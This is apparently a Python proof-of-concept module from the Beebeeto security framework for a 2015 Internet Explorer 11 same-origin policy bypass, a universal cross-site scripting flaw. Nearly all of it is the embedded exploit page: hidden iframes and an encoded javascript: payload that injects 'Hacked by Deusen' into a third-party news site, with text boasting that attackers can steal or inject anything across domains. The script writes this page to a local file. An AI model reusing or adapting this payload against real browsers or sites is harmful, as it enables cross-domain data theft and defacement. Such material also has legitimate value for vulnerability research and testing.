#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0026',
            'name': 'Internet Explorer 11 on Windows7 同源策略绕过漏洞 POC',
            'author': '雷蜂',
            'create_date': '2015-02-03',
        },
        # 协议相关信息
        'protocol': {
            'name': 'local',
            'port': [0],
            'layer4_protocol': [],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Internet Explorer',
            'vul_version': ['11'],
            'type': 'Other',
            'tag': ['IE同源策略Bypass', '同源绕过漏洞', 'IE11漏洞',],
            'desc': '''
                    Internet Explorer 11 on Windows 7 suffers from a same origin
                    bypass vulnerability via universal cross site scripting.
                    ''',
            'references': ['http://packetstormsecurity.com/files/130208/insider3show-bypass.txt',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        payload = r'''
        <title>insider3show</title>
        <body style="font-family:Georgia;">
        <h1>insider3show</h1>

        <iframe style="display:none;" width=300 height=300 id=i name=i src="1.php"></iframe><br>
        <iframe width=300 height=100 frameBorder=0 src="http://www.dailymail.co.uk/robots.txt"></iframe><br>
        <script>
        function go()
        {
          w=window.frames[0];
          w.setTimeout("alert(eval('x=top.frames[1];r=confirm(\\'Close this window after 3 seconds...\\');x.location=\\'javascript:%22%3Cscript%3Efunction%20a()%7Bw.document.body.innerHTML%3D%27%3Ca%20style%3Dfont-size%3A50px%3EHacked%20by%20Deusen%3C%2Fa%3E%27%3B%7D%20function%20o()%7Bw%3Dwindow.open(%27http%3A%2F%2Fwww.dailymail.co.uk%27%2C%27_blank%27%2C%27top%3D0%2C%20left%3D0%2C%20width%3D800%2C%20height%3D600%2C%20location%3Dyes%2C%20scrollbars%3Dyes%27)%3BsetTimeout(%27a()%27%2C7000)%3B%7D%3C%2Fscript%3E%3Ca%20href%3D%27javascript%3Ao()%3Bvoid(0)%3B%27%3EGo%3C%2Fa%3E%22\\';'))",1);
        }
        setTimeout("go()",1000);
        </script>

        <b>Summary</b><br>
        An Internet Explorer vulnerability is shown here:<br>
        Content of dailymail.co.uk can be changed by external domain.<br>
        <br>
        <b>How To Use</b><br>
        1. Close the popup window("confirm" dialog) after three seconds.<br>
        2. Click "Go".<br>
        3. After 7 seconds, "Hacked by Deusen" is actively injected into dailymail.co.uk.<br>
        <br>
        <b>Screenshot</b><br>
        <a href="screenshot.png">screenshot.png</a><br>
        <br>
        <b>Technical Details</b><br>
        Vulnerability: Universal Cross Site Scripting(XSS)<br>
        Impact: Same Origin Policy(SOP) is completely bypassed<br>
        Attack: Attackers can steal anything from another domain, and inject anything into another domain<br>
        Tested: Jan/29/2015 Internet Explorer 11 Windows 7<br>
        <br>
        <h1><a href="http://www.deusen.co.uk/">www.deusen.co.uk</a></h1><script type="text/javascript">
        //<![CDATA[
        try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"6e87366c9054a61c3c7f1d71c9cfb464",petok:"0fad4629f14e9e2e51da3427556c8e191894b109-1422897396-1800",zone:"deusen.co.uk",rocket:"0",apps:{}}];CloudFlare.push({"apps":{"ape":"9e0d475915b2fa34aea396c09e17a7eb"}});!function(a,b){a=document.createElement("script"),b=document.getElementsByTagName("script")[0],a.async=!0,a.src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=919620257c/cloudflare.min.js",b.parentNode.insertBefore(a,b)}()}}catch(e){};
        //]]>
        </script>
        '''
        # write
        test_html = open('./insider3show-bypass.html', 'w')
        test_html.write(payload)
        test_html.close()
        args['poc_ret']['vul_url'] = 'Generation ok, file: ./insider3show-bypass.html'
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())